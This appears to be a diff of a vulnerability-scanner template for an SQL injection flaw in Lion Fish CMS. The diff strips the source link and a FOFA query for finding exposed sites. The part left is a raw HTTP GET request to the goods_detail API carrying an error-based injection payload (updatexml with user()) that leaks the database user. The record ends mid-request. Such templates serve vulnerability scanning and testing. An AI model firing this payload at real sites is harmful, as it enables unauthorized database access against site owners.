@@ -3,12 +3,8 @@ info:
   name: 狮子鱼CMS SQL注入漏洞1
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tk0zml9gcyzwcxwp'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tk0zml9gcyzwcxwp
-    fofa: body="/seller.php?s=/Public/login"
 http:
 - raw:
   - 'GET /index.php?s=api/goods_detail&goods_id=1%20and%20updatexml(1,concat(0x7e,user(),0x7e),1) HTTP/1.1
